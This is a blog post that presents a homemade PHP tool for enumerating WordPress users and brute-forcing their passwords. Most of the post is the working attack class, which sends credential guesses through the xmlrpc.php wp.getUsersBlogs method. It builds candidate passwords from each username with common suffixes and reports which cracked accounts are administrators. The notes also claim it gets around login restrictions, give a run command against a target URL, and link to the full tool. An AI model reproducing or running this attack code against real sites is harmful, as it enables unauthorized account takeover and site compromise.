---
title: wordpress 用户枚举，爆破工具
date: 2015-2-6 19:39
tags: php控
---

> 欢迎对该工具进行修改优化，转载请注明原作者，写代码不易。

**为什么不用`wpscan`?**
>闲着蛋疼写着玩。

![2019-07-21-00-46-17](https://wolvez.oss-cn-hangzhou.aliyuncs.com/32348811296e75c15082c635cb39fde1.png)

**核心代码**

```php
<?php
include 'init.php';
define("user", $argv[2]);
class BruteWordPress
{
    private $rc;
    function __construct() {
        $this->rc = new RollingCurl();
        $this->rc->callback = $this->create_request_callback($this->rc);
        $this->rc->__set('window_size', Thread);
        $this->rc->__set('time_out', TimeOut);
    }
    
    function create_request_callback($rc) {
        return function ($response, $info, $request) use ($rc) {
            if ($info['http_code'] == 404 || $info['http_code'] == 403 || $info['http_code'] == 500) {
                echo '[-] Access error!' . PHP_EOL;
                $this->rc->cancelRequests();
            }
            
            $p = $request->post_data;
            preg_match_all('/<param><value>([^\s]+?)<\/value><\/param>/', $p, $m);
            $user = $m[1][0];
            $pass = $m[1][1];
            if (!preg_match('/<boolean>(\d)<\/boolean>/', $response, $is_admin)) {
                
                //echo '[*] Brote user ' . $user . " ..." . "\r";
                
                
            } else {
                
                //print_r($is_admin).PHP_EOL;
                if ($is_admin[1] == 1) {
                    echo '[+] Bruteed~ -> ' . iconv("UTF-8","GB18030//IGNORE",$user)  . ':' . $pass . ' [is admin]' . PHP_EOL;
                    $this->rc->cancelRequests();
                } else {
                    echo '[+] Bruteed~ -> ' . iconv("UTF-8","GB18030//IGNORE",$user)  . ':' . $pass . PHP_EOL;
                    $this->rc->cancelRequests();
                }
            }
        };
    }
    
    function run() {
        $pass_file = preg_replace('/\s$/', "", file(wordlist));
        $user_pre = array('123', '111', '1', 'a', 'pass', '!@#', 'password', 'abc', '1961', '1962', '1963', '1970', '1988', '1989', '1990', '1991', '1992', '1993', '1994', '1995', '1996', '1997', '1998', '1999', '2001', '2002', '2003', '2004', '2006', '2005', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015');
        foreach ($user_pre as $pre) {
            $pre_u[] = user . $pre;
        }
        $p = array_merge($pre_u, $pass_file);
        $passwords = array_unique($p);
        array_unshift($passwords, user);
        
        foreach ($passwords as $pass) {
            $url = domain . '/xmlrpc.php';
            $post_data = sprintf('<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>', user, $pass);
            $request = new RollingCurlRequest($url, 'POST', $post_data);
            $request->options = $GLOBALS["cUrl_options"]; 
            $this->rc->add($request);
        }
        $this->rc->execute();
    }
}

$brute = new BruteWordPress();
$brute->run();
?>
```



**说明:**
1. 使用非常简单无需其它参数
`php scan.php http://www.target.com`

2. 多线程同时进行,跑完一个用户成功立即退出该任务接着破另外一个用户

3. 自动生成用户名相关并加到字典头部 大大的提高破解速度

4. 模块可单独使用

6. 枚举用户模块 能抓取大部分常规 wordpress站点用户
检查枚举到的用户是否为登陆用户如果不是则剔除大大的提高破解效率

6. 该脚本 需curl 扩展支持

7. 利用wordpress 的xmlrpc.php 文件破解
可绕过限制并判断是否为管理员用户

8. 环境简单
仅需 php.exe 、php5ts.dll 、curl.dll 


**文件说明**
```text
init.php 配置及功能函数
enum_user.php 根据页面枚举用户
chkuser.php 检测枚举到的用户是否为可登陆用户
RollingCurl.php 多线程http请求类 （修改版）
BruteWordPress.php 爆破类
scan.php 主文件(要运行的文件)
```
[绿色php环境](https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/php.zip)
[完整代码下载](https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/wpbt.zip)




